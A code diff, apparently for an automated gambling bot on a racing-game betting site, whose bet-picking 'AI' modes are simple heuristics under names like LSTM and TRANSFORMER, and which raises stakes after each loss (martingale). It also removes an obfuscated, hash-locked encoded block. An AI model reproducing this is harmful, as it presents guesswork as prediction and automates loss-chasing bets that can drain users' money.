+        # ưu tiên NV từng thắng ở cùng phase
+        hits = [recent[i] for i in range(phase, len(recent), 6)]
+        if hits:
+            return Counter(hits).most_common(1)[0][0]
+        return pick_max(base)
+
+    if mode == "CORRELATION":
+        # NV hay đi sau last
+        if len(recent) < 3:
+            return pick_max(base)
+        tm = _cdtd_transition_matrix(recent)
+        return pick_max(tm.get(recent[-1], base))
+
+    if mode == "CLUSTER":
+        # cụm hot vs cold — chọn trong cụm đang "đến lượt"
+        sorted_nv = sorted(candidates, key=lambda i: wins[i - 1], reverse=True)
+        hot, cold = sorted_nv[:3], sorted_nv[3:]
+        # nếu 2 ván gần thuộc hot → nghiêng cold
+        if len(recent) >= 2 and recent[-1] in hot and recent[-2] in hot:
+            return random.choice(cold)
+        return random.choice(hot)
+
+    if mode == "ANOMALY":
+        # NV lệch mạnh so với trung bình (bất thường)
+        avg = total100 / 6.0
+        sc = {i: abs(wins[i - 1] - avg) for i in candidates}
+        # đánh vào phía đang "bất thường thấp" (sắp bắt kịp)
+        low = [i for i in candidates if wins[i - 1] < avg]
+        if low:
+            return random.choice(low)
+        return pick_min({i: wins[i - 1] for i in candidates})
+
+    if mode == "ENTROPY":
+        # phân phối gần đều → random; lệch → theo probability
+        probs = [w / total100 for w in wins]
+        ent = -sum(p * math.log(p + 1e-12) for p in probs)
+        max_ent = math.log(6)
+        if ent > 0.9 * max_ent:
+            return random.choice(candidates)
+        return cdtd_execute_ai("PROBABILITY", data_top10, data_top100)
+
+    if mode == "FUZZY":
+        form = _cdtd_ewma_form(recent)
+        sc = {}
+        for i in candidates:
+            hot = min(1.0, form.get(i, 0) * 3)
+            long = min(1.0, wins[i - 1] / max(1, max(wins)))
+            # fuzzy rules
+            sc[i] = 0.6 * max(hot, long) + 0.4 * min(hot + 0.2, 1.0)
+            if recent and i == recent[-1]:
+                sc[i] *= 0.75
+        return pick_max(sc)
+
+    if mode == "LSTM":
+        # pattern sequence đơn giản: nếu A-B-A → đoán B
+        if len(recent) >= 3 and recent[-3] == recent[-1]:
+            return recent[-2]
+        if len(recent) >= 5 and recent[-5] == recent[-2] and recent[-4] == recent[-1]:
+            return recent[-3]
+        return cdtd_execute_ai("MARKOV", data_top10, data_top100)
+
+    if mode in ("TRANSFORMER", "ATTENTION"):
+        # attention trên lịch sử: trọng số theo khoảng cách
+        if not recent:
+            return pick_max(base)
+        attn = {i: 0.0 for i in candidates}
+        n = len(recent)
+        for idx, nv in enumerate(recent):
+            w = math.exp(-0.15 * (n - 1 - idx))
+            attn[nv] += w
+        # query = last → value = transition
+        tm = _cdtd_transition_matrix(recent)
+        last = recent[-1]
+        sc = {i: 0.55 * tm[last].get(i, 0) + 0.45 * (attn[i] / (sum(attn.values()) or 1)) for i in candidates}
+        return pick_max(sc)
+
+    if mode == "DEEP_Q":
+        # Q-value: reward nếu chọn NV theo form + phạt streak
+        sc = dict(base)
+        if recent:
+            sc[recent[-1]] -= 0.2
+        try:
+            for b in list(cdtd_bet_history)[-8:]:
+                nv = b.get("chosen")
+                if nv in sc:
+                    sc[nv] += 0.12 if b.get("result") == "win" else -0.08
+        except Exception:
+            pass
+        return pick_max(sc)
+
+    if mode == "META":
+        # meta: chọn strategy phụ theo entropy + streak gần đây
+        if len(recent) >= 3 and recent[-1] == recent[-2] == recent[-3]:
+            return cdtd_execute_ai("MEAN_REVERT", data_top10, data_top100)
+        if len(recent) >= 4 and len(set(recent[-4:])) <= 2:
+            return cdtd_execute_ai("COLD_TRACK", data_top10, data_top100)
+        return cdtd_execute_ai("SMART", data_top10, data_top100)
+
+
+    if mode == "SAFE_RISK":
+        # VIP: chọn NV rủi ro thấp nhất (risk% + form + tránh vừa thắng)
+        sc = {i: 0.0 for i in candidates}
+        try:
+            rows = compute_cdtd_nv_risk(data_top10, data_top100)
+            for row in rows or []:
+                nv = int(row.get("id") or 0)
+                if nv not in sc:
+                    continue
+                risk = float(row.get("risk_pct", 50) or 50) / 100.0
+                form = float(row.get("form10", 0) or 0)
+                sc[nv] += 0.60 * (1.0 - risk) + 0.25 * form
+        except Exception:
+            for i in candidates:
+                sc[i] = float(base.get(i, 0))
+        # kết hợp base nhẹ
+        for i in candidates:
+            sc[i] += 0.20 * float(base.get(i, 0))
+        return pick_max(sc)
+
+    if mode == "ENSEMBLE":
+        # tổng hợp có trọng số + bonus performance
+        voters = [
+            ("HOT_TRACK", 1.0),
+            ("COLD_TRACK", 0.9),
+            ("SMART", 1.2),
+            ("MARKOV", 1.1),
+            ("BAYES", 1.0),
+            ("NEURAL", 1.15),
+            ("MEAN_REVERT", 0.95),
+            ("MOMENTUM", 0.85),
+            ("TREND_UP", 0.9),
+            ("ATTENTION", 1.05),
+            ("SAFE_RISK", 1.55),
+            ("COLD_TRACK", 1.1),
+        ]
+        votes = defaultdict(float)
+        for name, w in voters:
+            try:
+                # tránh đệ quy ensemble
+                if name == "ENSEMBLE":
+                    continue
+                v = cdtd_execute_ai(name, data_top10, data_top100)
+                # adaptive weight từ AI_PERFORMANCE nếu có
+                perf = AI_PERFORMANCE.get(f"CDTD_{name}", {})
+                total_p = int(perf.get("total", 0) or 0)
+                if total_p >= 5:
+                    wr = float(perf.get("wins", 0)) / total_p
+                    w *= 0.6 + 0.8 * wr
+                votes[v] += w
+            except Exception:
+                continue
+        if votes:
+            return pick_max(dict(votes))
+        return pick_max(base)
+
+    # fallback
+    return _cdtd_weighted_pick(base, 0.9)
+
+
+def cdtd_score_athletes(data_top10, data_top100) -> Dict[int, float]:
+    """Điểm xếp hạng NV (multi-bet) — dùng base score + noise nhỏ."""
+    scores = _cdtd_base_scores(data_top10, data_top100)
+    for i in range(1, 7):
+        scores[i] = float(scores.get(i, 0)) + random.uniform(0, 0.03)
+    return scores
+
+
+
+
+def cdtd_execute_ai_multi(mode: str, data_top10, data_top100, n: int = 1) -> List[int]:
+    """
+    Chọn n NV — AI + lọc risk thấp (giảm thua).
+    Trả [] nếu toàn bộ quá rủi ro → bỏ ván.
+    """
+    n = max(1, min(5, int(n or 1)))
+    primary = cdtd_execute_ai(mode, data_top10, data_top100)
+    try:
+        primary = int(primary)
+    except (TypeError, ValueError):
+        primary = random.randint(1, 6)
+
+    scores = cdtd_score_athletes(data_top10, data_top100)
+    # ưu tiên risk thấp trong score
+    try:
+        for row in compute_cdtd_nv_risk(data_top10, data_top100) or []:
+            nv = int(row.get("id") or 0)
+            if nv in scores:
+                scores[nv] += 0.45 * (1.0 - float(row.get("risk_pct", 50) or 50) / 100.0)
+    except Exception:
+        pass
+    if primary in scores:
+        scores[primary] += 0.2
+    ranked = sorted(scores.keys(), key=lambda x: scores[x], reverse=True)
+    filtered = _cdtd_conservative_pick(ranked, n, data_top10, data_top100)
+    return filtered
+
+
+def cdtd_game_loop():
+    global cdtd_issue_id, cdtd_previous_issue, cdtd_last_winner, cdtd_predicted_nv, cdtd_predicted_nvs
+    global cdtd_ui_state, cdtd_analysis_start_ts, cdtd_round_warning
+    global cdtd_current_bet, cdtd_win_streak, cdtd_lose_streak, cdtd_max_win_streak, cdtd_max_lose_streak, cdtd_stop_flag
+    global cdtd_stats, cdtd_pause_remaining, cdtd_skip_next, cdtd_rounds_placed, cdtd_bet_placed_this_round, cdtd_checked_result
+    
+    cdtd_stop_flag = False
+    cdtd_issue_id = None
+    cdtd_previous_issue = None
+    cdtd_last_winner = None
+    cdtd_predicted_nv = None
+    cdtd_predicted_nvs = []
+    cdtd_ui_state = "WAITING"
+    cdtd_analysis_start_ts = None
+    cdtd_win_streak = 0
+    cdtd_lose_streak = 0
+    cdtd_max_win_streak = 0
+    cdtd_max_lose_streak = 0
+    cdtd_rounds_placed = 0
+    cdtd_skip_next = False
+    cdtd_pause_remaining = 0
+    cdtd_bet_placed_this_round = False
+    cdtd_checked_result = False
+    cdtd_current_bet = cdtd_base_bet
+    cdtd_bet_history.clear()
+    cdtd_stats = {'win': 0, 'lose': 0, 'asset_0': user_asset_cdtd().get(cdtd_coin, 0)}
+    
+    with Live(cdtd_generate_layout(), refresh_per_second=3, console=console, screen=True) as live:
+        while not cdtd_stop_flag:
+            try:
+                data_top10 = top_10_cdtd()
+                if not data_top10 or len(data_top10) < 1:
+                    time.sleep(1)
+                    continue
+                    
+                current_issue = data_top10[0][0] if data_top10[0] else None
+                
+                if current_issue and current_issue != cdtd_previous_issue:
+                    has_prediction = (cdtd_predicted_nv is not None) or (cdtd_predicted_nvs)
+                    if cdtd_previous_issue is not None and has_prediction and not cdtd_checked_result:
+                        try:
+                            winner = int(data_top10[1][0]) if data_top10 and len(data_top10) > 1 and data_top10[1] else None
+                            if winner is not None:
+                                cdtd_last_winner = winner
+                                balance_before = user_asset_cdtd().get(cdtd_coin, 0)
+                                result_type = 'win'
+                                
+                                # Cập nhật từng lệnh cược (multi: mỗi NV một dòng)
+                                pending_bets = [b for b in cdtd_bet_history if b.get('result') == 'pending']
+                                round_lost = True if pending_bets else False
+                                for b in pending_bets:
+                                    b['winner'] = winner
+                                    if b.get('chosen') == winner:
+                                        b['result'] = 'win'
+                                        round_lost = False
+                                    else:
+                                        b['result'] = 'lose'
+                                
+                                # Streak / martingale tính theo VÁN (không theo từng NV)
+                                if pending_bets:
+                                    if round_lost:
+                                        cdtd_lose_streak += 1
+                                        cdtd_win_streak = 0
+                                        cdtd_max_lose_streak = max(cdtd_max_lose_streak, cdtd_lose_streak)
+                                        cdtd_current_bet *= cdtd_multiplier
+                                        cdtd_stats['lose'] += 1
+                                        try:
+                                            _algo = str((cdtd_settings or {}).get('algo', 'SMART'))
+                                            AI_PERFORMANCE[f'CDTD_{_algo}']['losses'] += 1
+                                            AI_PERFORMANCE[f'CDTD_{_algo}']['total'] += 1
+                                        except Exception:
+                                            pass
+                                        result_type = 'lose'
+                                        if cdtd_pause_rounds > 0:
+                                            cdtd_pause_remaining = cdtd_pause_rounds
+                                    else:
+                                        cdtd_win_streak += 1
+                                        cdtd_lose_streak = 0
+                                        cdtd_max_win_streak = max(cdtd_max_win_streak, cdtd_win_streak)
+                                        cdtd_current_bet = cdtd_base_bet
+                                        cdtd_stats['win'] += 1
+                                        result_type = 'win'
+                                        try:
+                                            _algo = str((cdtd_settings or {}).get('algo', 'SMART'))
+                                            AI_PERFORMANCE[f'CDTD_{_algo}']['wins'] += 1
+                                            AI_PERFORMANCE[f'CDTD_{_algo}']['total'] += 1
+                                        except Exception:
+                                            pass
+                                
+                                time.sleep(1)
+                                balance_after = user_asset_cdtd().get(cdtd_coin, 0)
+                                pnl_van = balance_after - balance_before
+                                total_pnl = balance_after - cdtd_stats['asset_0']
+                                
+                                if TELEGRAM_ENABLED and TELEGRAM_CHAT_ID and pending_bets:
+                                    bet_nv = cdtd_predicted_nv
+                                    # Tổng tiền cược cả ván (multi)
+                                    bet_amount = sum(float(b.get('amount', 0) or 0) for b in pending_bets)
+                                    telegram_msg = build_cdtd_telegram_message(
+                                        cdtd_previous_issue, winner, bet_nv, bet_amount,
+                                        result_type, pnl_van, total_pnl,
+                                        balance_before, balance_after,
+                                        cdtd_stats['win'], cdtd_stats['lose'],
+                                        cdtd_max_win_streak, cdtd_max_lose_streak
+                                    )
+                                    threading.Thread(target=send_telegram_message, args=(telegram_msg,), daemon=True).start()
+                                
+                                cdtd_checked_result = True
+                                cdtd_ui_state = "RESULT"
+                                live.update(cdtd_generate_layout())
+                                time.sleep(2)
+                        except Exception as e:
+                            safe_console_print(f"[yellow]⚠️ Lỗi xử lý kết quả: {e}[/yellow]")
+                    
+                    cdtd_previous_issue = current_issue
+                    cdtd_issue_id = current_issue
+                    cdtd_predicted_nv = None
+                    cdtd_predicted_nvs = []
+                    cdtd_bet_placed_this_round = False
+                    cdtd_checked_result = False
+                    cdtd_analysis_start_ts = time.time()
+                    cdtd_ui_state = "ANALYZING"
+                    live.update(cdtd_generate_layout())
+                
+                if cdtd_ui_state == "ANALYZING":
+                    elapsed = time.time() - (cdtd_analysis_start_ts or time.time())
+                    if elapsed >= cdtd_analysis_duration - 8 and not cdtd_bet_placed_this_round:
+                        mode = cdtd_settings.get("algo", "ENSEMBLE")
+                        data_top100 = top_100_cdtd()
+                        n_pick = max(1, min(5, int(cdtd_num_athletes or 1)))
+                        chosen_list = cdtd_execute_ai_multi(mode, data_top10, data_top100, n_pick)
+                        if not chosen_list:
+                            chosen_list = [random.randint(1, 6)]
+                        cdtd_round_warning = ""
+
+                        cdtd_predicted_nvs = list(chosen_list)
+                        cdtd_predicted_nv = chosen_list[0] if chosen_list else None
+                        cdtd_ui_state = "PREDICTED"
+                        live.update(cdtd_generate_layout())
+                        
+                        should_bet = True
+                        if cdtd_pause_remaining > 0:
+                            cdtd_pause_remaining -= 1
+                            should_bet = False
+                        if cdtd_skip_next:
+                            cdtd_skip_next = False
+                            should_bet = False
+                        
+                        if should_bet and cdtd_issue_id is not None and chosen_list:
+                            next_issue = cdtd_issue_id + 1
+                            bet_amount = cdtd_current_bet if cdtd_current_bet else cdtd_base_bet
+                            asset = user_asset_cdtd()
+                            total_need = bet_amount * len(chosen_list)
+                            if total_need > asset.get(cdtd_coin, 0):
+                                cdtd_current_bet = cdtd_base_bet
+                                bet_amount = cdtd_base_bet
+                                # Nếu vẫn không đủ cho multi → giảm số NV
+                                while len(chosen_list) > 1 and bet_amount * len(chosen_list) > asset.get(cdtd_coin, 0):
+                                    chosen_list = chosen_list[:-1]
+                                cdtd_predicted_nvs = list(chosen_list)
+                                cdtd_predicted_nv = chosen_list[0] if chosen_list else None
+                            
+                            any_ok = False
+                            for nv in chosen_list:
+                                success, msg = bet_cdtd(next_issue, nv, bet_amount)
+                                if success:
+                                    any_ok = True
+                                    cdtd_bet_history.append({
+                                        'issue': next_issue,
+                                        'chosen': nv,
+                                        'amount': bet_amount,
+                                        'result': 'pending',
+                                        'algo': mode,
+                                        'multi': len(chosen_list),
+                                    })
+                                else:
+                                    safe_console_print(f"[red]❌ Đặt cược NV {nv} thất bại: {msg}[/red]")
+                            
+                            if any_ok:
+                                cdtd_rounds_placed += 1
+                                cdtd_bet_placed_this_round = True
+                                if cdtd_bet_rounds_before_skip > 0 and cdtd_rounds_placed >= cdtd_bet_rounds_before_skip:
+                                    cdtd_skip_next = True
+                                    cdtd_rounds_placed = 0
+                        
+                        live.update(cdtd_generate_layout())
+                    
+                    elif elapsed >= cdtd_analysis_duration + 15:
+                        cdtd_ui_state = "WAITING"
+                        # giữ cdtd_issue_id — header vẫn hiện kỳ đang chờ
+                        live.update(cdtd_generate_layout())
+                
+                live.update(cdtd_generate_layout())
+                time.sleep(0.5)
+                
+            except KeyboardInterrupt:
+                cdtd_stop_flag = True
+                break
+            except Exception as e:
+                safe_console_print(f"[yellow]⚠️ Lỗi CDTD: {e}[/yellow]")
+                time.sleep(3)
+                # ================== GIAO DIỆN CDTD ==================
+
+
+
+# Cache risk CDTD ~2.5s để live UI không spam API mỗi frame
+_cdtd_risk_cache: Dict[str, Any] = {"ts": 0.0, "rows": None, "top10": None, "top100": None, "by_id": {}}
+
+
+def _cdtd_risk_bundle(force: bool = False) -> Dict[str, Any]:
+    """Lấy top10/top100 + risk từng NV, cache ngắn để cập nhật mỗi ván."""
+    global _cdtd_risk_cache
+    now = time.time()
+    # hết hạn cache hoặc sang issue mới → tính lại risk mỗi ván
+    cached_issue = _cdtd_risk_cache.get("issue_id")
+    issue_changed = (cdtd_issue_id is not None and cached_issue is not None and cached_issue != cdtd_issue_id)
+    if (
+        not force
+        and not issue_changed
+        and _cdtd_risk_cache.get("rows") is not None
+        and (now - float(_cdtd_risk_cache.get("ts") or 0)) < 2.5
+    ):
+        return _cdtd_risk_cache
+    try:
+        top10 = top_10_cdtd()
+    except Exception:
+        top10 = ([0], [1])
+    try:
+        top100 = top_100_cdtd()
+    except Exception:
+        top100 = ([1, 2, 3, 4, 5, 6], [0, 0, 0, 0, 0, 0])
+    try:
+        rows = compute_cdtd_nv_risk(top10, top100)
+    except Exception:
+        rows = []
+    by_id = {int(r["id"]): r for r in rows if r.get("id") is not None}
+    _cdtd_risk_cache = {
+        "ts": now,
+        "rows": rows,
+        "top10": top10,
+        "top100": top100,
+        "by_id": by_id,
+        "issue_id": cdtd_issue_id,
+    }
+    return _cdtd_risk_cache
+
+
+def cdtd_active_issue():
+    """Kỳ đang chờ / đang cược (pending) — ưu tiên hiển thị trên header."""
+    # 1) Lệnh cược còn pending
+    try:
+        for b in reversed(list(cdtd_bet_history)):
+            if b.get("result") == "pending" and b.get("issue") is not None:
+                try:
+                    return int(b["issue"])
+                except Exception:
+                    return b["issue"]
+    except Exception:
+        pass
+    # 2) Đã khóa dự đoán → cược cho kỳ kế tiếp
+    if cdtd_issue_id is not None and (cdtd_predicted_nv is not None or cdtd_predicted_nvs):
+        try:
+            return int(cdtd_issue_id) + 1
+        except Exception:
+            return cdtd_issue_id
+    # 3) Kỳ API hiện tại
+    return cdtd_issue_id
+
+
+def build_cdtd_header():
+    """CDTD / NOVA: status cockpit ngang, tối ưu cho terminal rộng và điện thoại."""
+    asset = user_asset_cdtd().get(cdtd_coin, 0)
+    pnl = asset - cdtd_stats["asset_0"]
+    pnl_color = TST_COLORS["emerald"] if pnl >= 0 else TST_COLORS["ruby"]
+    title = Text()
+    title.append("CDTD", style=f"bold {TST_COLORS['sapphire']}")
+    title.append("  /  ", style=TST_COLORS["muted"])
+    title.append("ĐIỀU KHIỂN ĐUA", style=f"bold {TST_COLORS['platinum']}")
+    title.append("   TRỰC TIẾP", style=f"bold {TST_COLORS['emerald']}")
+    cells = [
+        ("USER", str(USER_ID or "N/A"), TST_COLORS["sapphire"]),
+        ("SỐ DƯ", f"{asset:,.4f} {cdtd_coin}", TST_COLORS["gold"]),
+        ("P&L", f"{pnl:+,.4f}", pnl_color),
+        ("CHUỖI", f"{cdtd_win_streak}T / {cdtd_lose_streak}B", TST_COLORS["neon_pink"]),
+        ("KEY", str(_key_type).upper(), TST_COLORS["sky"]),
+        ("KỲ", str(cdtd_active_issue() or "—"), TST_COLORS["muted"]),
+    ]
+    g = Table.grid(expand=True, padding=(0, 1))
+    for _ in cells:
+        g.add_column(ratio=1)
+    g.add_row(*[
+        Text.from_markup(f"[bold {c}]{label}[/]" + chr(10) + f"[bold white]{value}[/]")
+        for label, value, c in cells
     ])
-
-_산초구 = _투늘한(_아송허, _남파후, _기포보, _투바타, _람송구, _도라카)
-if hashlib.sha256(_산초구.encode("utf-8")).hexdigest() != _강러정:
-    raise SystemExit(
-        "PyHydra로 암호화된 코드: 제작자 메타데이터가 변경되었습니다. "
-        "실행을 거부합니다."
+    return Group(
+        Align.center(title),
+        Rule(style=TST_COLORS["sapphire"]),
+        Panel(g, border_style=TST_COLORS["onyx"], box=box.SIMPLE, padding=(0,1)),
     )
 
-_초리어 = "0IgUIJGKfw^c%3EH무투`ii<Hg~!드hVhigBxyn`Z한7`pv수?`fB=j구Jp83g김카<JTl?V다카u$부N니코aD&5X`^lwd방I4fc오At안@s잔B6a?AwdjzWS<`미c&w)_r`zLK지반r4+)루3xI다W-v5rvnAmhX~#w$2l-RdPBJdc(늘1NE+wd)hJ_더K가AJx$보lQa=@yxhk^y`pv머VdcTAPuf#I0산u830더1고W1fN더*<nZPU보dUykeF@gJ7소#E2MJJ_-jl=r{(카|판`}O라kpyA-강|정|uhD8|오~}b{<만7gQ땅CstRtB너i;J)?5정안8AKEa_시vR탄VK암A저머xleikrB파j안VyVU모F(zp사n탄lO피g_13B`Tdk고uW정Cl=P류@lM`^M}_들sG강l0x자포SugcHzVU고J8v|후디kGh4남PZuKW+lJ우강wWWO?frJz9h&;9Kx(<키t5bn4땅Sc고-eTXiTFB수M람바남oFU8Ln+$O~송vqi11eny디`CcEbneM+9liS*니Sfv>C후#N9서바xF_90투$YM산;늘*N로fhaq#5지-두코kSi아5vfk독vJ?)G;zjf#1EjsE?바B보%?}q오코o카8주ss(4~Qjf2a자O히_49UA#강Hp4hn{*GQ0m나l키!k+<Y+늘KGi=fN-lj하wq0해하저|푸호mZ리^x파uCBiP&o티o4~구1uN@M-f`도tNwAK8YMn치+<|e허hcmNrZ&)kJ추Ioh<=-j^황달{1oYVP!Qt^($E&8SwpVMDLx!HhUXBZ도ma4CV소Z;F3ia장rmOqv안n_InH박이?&H안L69히?7강DLUvk|rPhnqXcJsZ+9c@o#bU6e3;|L7<람Wp{G조퍼E권H-@%JIR|zmC아fr달TgcC7V(Ngs#UzYx조더>{(Ed&EdBa>S-oZ7GQZ??s피)hk^oIE9|허4muIj러Er다gC>F)??저?#지;문MQgW|OyIS~*T=-{=BkN2m)XTy람n리o4#69$y후u*oX(러F+`@;M+주U칸c`|A고머보w<w@F!HA;소s지허?p모<x2o2사a`1aKU+v&하W`J0C<노NAeR?{Z만강~j김무lD거LTm무MI7~X}{Lv?1HxZ3?ThZ리CyHMo{?FGqCSo>+Gf4G$fts코히U}보Fm0P@mbFb?|B;d}김I0Oq;)eF`L푸UVo8=ez5jChk`G^z*vkRW드*M{$p(서|1x8k2JYJW95Uo5p{f-r<rtg안U~N0루otiZ지KGA수티~6ygd1L}퍼cT치_5한Gu드3pw디=잔?h니K8_H두#가w62c8bXuB)`xh다%u티4잔r히$j3WSj잔V?치&Kg`^7fu;Nz!*6e람^rSQpq서M;Q안PTGit3iJfr74ajfS(사#ui디Db투YZpX@X하8fGw#<v(R신fISNN0=us-Bs키qzdqR<미미Cv9Cl수g}{>최PDP다*+$5eDfov치Is7코F((yZXT9En-vKr*maIiN8JJa한소@;)q황(안E한2P&@vU;k류&들=J안o}b달Z람p3해$M송oP!o_sy서r들7;k{JTrwXFr3&7(fD호Df7yNIjI>-S7+kgb!|8=`^코{j{&0G부토psY-k달b김5f남2mAM하);)최(A람5DE노0Jmu41+s&4GADp%1모j4uU*m&s`송차3나^_hbm4Ah24서최^사5jjNXzfy2IDgRxS6*nDJcE코yu((CZZz$;(@b피0Yk}X반7I{H)}{<SV+더q(*8z9v!F-t==fHf하z찬!QOoFuZ{>산aom#8초~GO2-o~q독zU=hz-Mh=BXA>$eM가pTYA&`A저o8mJN9%=E5허gSgXuE버PiTKE%t>5푸&_*RJAT꽃리U7x2Hzik!칸|po(lL니1LlNReC강G산TXo0q<피VjA람smc?Nszk^`@C?Y독구bmOKEL마}cS1xZHep{<n(q암O탄@kCMVgBFYVFO투F지푸나$B{미BW28S강xCEwzEwL5+0s{li99<;KTm허^i비{M지<T8o람#도Vjuyw0sz^E9p우ZK안7?A77NR79;H구b>더김i파YwTv6%cMsns`최CKy7다마고;OlNgobYr^;T*노w-fIJK정NL누2~y하)@!&(d`탄RMMcd{CcA~dyuNt#>rY푸lEUG3GvY람저o_Tu(조nwjz더!P0ZVlEh~0J@WQGNrz3cAS4j&조=노ikC5a름CgV|-PJQw피`cW?Nx-x%K+TE키푸dND25GVQg-9TTEZ#MWozx름epwJgTHg)%o구!들CpYAaRl}+dXSr탄-yC#W|~n암S{빛WeYVfIcN2~권QmHR가uaFl-$c2ZXELg들M;`=6f;rJU12황나eW3사f6Cby탄1바$)x%OoU$6CFk두@WMk2Kc&-~주nO도n{rZhN1;#CdoE>wjp9@t0&?yu7+`주7^&Y`vki)}시hx!i*ue-C)라wZM달LW$Neh호R코Q>U;m|#호6e(u5-무@}or거$;UPS0R#_)cUWp해고Ou2YD*7<9_>hL$우l+초DN9sl=F?UpY7q6q<c한zEJ-WJB*찬HA1^!@F_EDf산코1XRdNqc루O1&i;Ghi아71L<y$Farr사p8G0C9k&@`IKDcrp}GHGW$>Xo)i2b1kFKQ신tE<V$nOD}bb5i!$NIcky<ema~4+#수qrX8D!Sdwnf6K}+I서!G0swS<N권BH윤쿠k!a서후7bom*지yy@안48br소_83t서z`RtF|=00t초미qJsNd@;M>iH`ulM쿠달)efwud!gZ토5pvUq{C5안m+7`vII9빛XrO{VKf_llN#QHZl-8{gy^7?&m~xk^{V저1tV<AMT`_qZ}Z7머K&aX{D처gfr노^(P윤gC=9wM호$i반FO*CZn(&V#he기^W루=3ty|포yo_}서}~LXske#YH~M6z판1YZ+Li누3;d+송b692러pya4d치8A권qE포dv로KCU파iiyY=Hg디a디_6버?#Uk산pXJ(E탄Oj허i!%a미U강d)6wAXcfC=9(g7QlJzN#*G들R+K산_5{디-s)_~#!lEr}추f탄iI@<9버바신>=로;투&%gj하}j<zz^e;;vhQj9nw라}+Guc9X7ZJ16O)*루pm부도8안U박mLRg~rm~X8`6Gmq`fb구qrke2@4%LQrv+|%NbOtAJ아(b2l^g&S히8KF꽃M=_름E=호&s-!}!)해W3T>A*C+빛f;노5#t<-HQ0Rhlj{i=름Bhu|Ax초j~ERu4%Z|처w^5X람Z장L6E#9as-TryRn가K@탄fhe=UG무버<고0i^r`X^#h모N6By78e하@6q2ku{ux(|쿠F키1uoOe자V>CR=X$잔CQjHM=@9!cu%p@A0;R8r타코&9d|e1JXEF도q)Q-9m>8=*들K4!I니r>rZ`어d87$qg|J|F)XBt9U)a^Z@(sa8p4노수zMsxgE22?guvqi`4?Tb`cEYhcy<4서A하y^AzU+루NN?피boY)-->mI9비QtYo92_가*서Ya장lUOgvfX+s?uiye|_5kH|q_L0ZM6-8=기C어!V람D2Ti보4Q-8q2y2=Sy~4Mo+^f<1빛-#+)2nXr6`;fa`gCpsQ두bC(S%;_Me치e카7p바7버9L?os?9만TT6F비(;TvTZ>티6)ADp*Or56-퍼OTp(w8Q!8tN`#v0b&05nE)D호칸#|J~s늘Sfp8@미Pl7커#김D~fI8l>k^T조`QTZyj<rRv^=류tQq(커^^w오#x*MK소e#다N보Y1*l3t3O&0hT7D(m2*Ve(j황`Qn`e코**5kSeJ누Od9)8>}FwCf$7bq9w&_IAp~OA*z73Kl추호_%F조B5장?0UYsKRNnSIAI3Oxq$=uK`z{kJvU1산Ru@x&KO>30vuWE;4+XAPf`C바사%($Y`#우`R*무*l3잔U&%Pg_678bR사l|l<`E$U8XnV?c2K3MmW0fj$5w산yyWRoEE??@0-7kWsVmwqpobR*3@fL5황7>x$B3W22`fj>s=j0dbw<l드OSBV3)X~D|머모#안2q|GVO?Eq=4히5Z`qp&^d6B!바c도Bg>!<KIgV^g윤VjYJEHf디hF꽃g8tz&VImxER푸xjT_c허pf바D*8j;5h7N}q$sd1VU=-안U5)들dA$구+LGMVB53ed8X안S황;_Y하E8>다피80FO_Wng퍼보8Xxfblof)z|파V칸빛qTr}Uun97ro하?Vt!)IbWguJ`5HM*!~{마y^=$jOIBwmxwRR늘V;;땅4&?~j#_2<5%3pHawcp암꽃T&4+KRA-`vcP2*b거bd@5a|6QD6PlB*D<Dx6!AT&q^bWVlkH@Y해K@*더mQlFRDcSaOorgJ시$산정2I|YXuoXcP^vC&마3하더-pdlHd꽃u{pxnylq_6임DY6문치I$Q%`tY구키B거O<DmQTH|*잔a구=z나U++C=iSiyi#P+`4오DuMow안U~2Uh;h{N)B)^xzLh4{3K%`~!남안_달D`ed2&2LCD마dfw)WXT-X임꽃키+Y{)C0I6uI1o^히황Q4$d+xKMtuw$E박y두R|KCh가타EdG>R82PDUK박2x=6mlxsH커YbA너P$Rk%%Pu<ONoHY6p3YxxNCF-5{lu99C리Z{iR1j^xF{Aw0파C0y1~H버타장*<8ccCk임|s2`)>CPg?c@n>F<oXSq문9독y!FvMrjk=!Am}LuuuO>-mo달d보A1VS<45$I0JFm>러p0bmG3Zi3kUQ|H18머6zv<퍼*6A6L_h+M6vv!97-Sa%키J}*dYR8}a6바Wn남름Fv9호무R타ec늘^^2;H+F%Lp1{dI>{itR땅UahcJU노R리h오(김6qDzpyfeb^e지}WaSc3w_679WkD8#6Yx달V`|C_너w|+SieF조&{자반SF안$=바7?U조>Tu;5RwVG바|qAL07T=hsF42P<7sqbK5아3qyhe^%2*땅Zim`윤cofg$qa오PS처토<H우5Dh추임CzsB|@xDLl4신t람B{$서u`r%^3조B2T터p한김P황6e+H다김QJD=u<j반i%e_W5W다zcf%PD?l9-gY(7U류m`i산XFhl들qe서PMhjCKOJ%Hu&zY박@l디>토%yc쿠q^XR#>o누det디G-추e?S|B8우E)eoue{마hw디==코U_GSOxbl찬찬권wKWLcZi|57저2vJ=tbQv;(%y5달리dNez니%hB%nc구(Z(8파=@4{MQ보윤다G장~4I%F=0E@VffjJ기n&~)}OlWN노K<|?zq달$JpuPse}퍼nNMl}누^IBFhHfV서>0w!jW빛mn)aHDR9보5i{d_S3-e`비땅S나&ttw-?%달h#kV4S?8?L@(허Rvs#>}e@무Phe구+$E아라JUZG7(ub__>My가8I|xNMDBR92V노2o_CeI5허류바주1D1O#i1>xaY임FOqX서&피&G)$Go바_+OscZ8b호Zc기Pd<|j(90|B3p2u김u투{sV소f6rYoVVL초가wg<n0!tk7ZX7>후u*3Bo{l=fZ;r1XB보8n2람#3tCTCku?N1hE_YyGd0수어do!}l#투BV0Z모A==Wpn}eP9IE{Zqk~R0_Pgm*N누XZ$}uA#달lO-LNM서>MO}마^s&7D보>r(9&YaO조R?>(모2Ag4I)N<`구^qp@dFsx>7;Fpu8>hK|리P퍼>산)NbK=Q*W+Ib모%기VLf;E_b&STzw-mu$독*$*+ZT거kA_yc60라%꽃WS_NW어)w#lFMY>JL<4;7?$T*_YYaw찬이lG36토산ON정8a)방9커jA8OS권=uvtEb8$n#&qD*HNFw도^4Q한FE도MHEOv저<J8황;6Hh<누GN안h니-UI8(>R김{남푸-MGp문2Rsnmr#8op람*TW-d&(2dq@)e>강l-yb9Geu{pLz우|rm^gCR{q84U_pwr}초cf꽃qQ머코TDBnkf0_18#ZDV%$s?*강-l로KU다러g~{*CX9~^z=|X1^swfzuzxjj6B{#(tW_O!W~2<EeJMHvsj차7-R땅9r찬I((송{Xyd방p9안(^=bvAVZi터bcF%f+IJU!YM1Qf4iyDmQ-%brqkGoOl어y`I5G구dm시eAk24>J우387kFB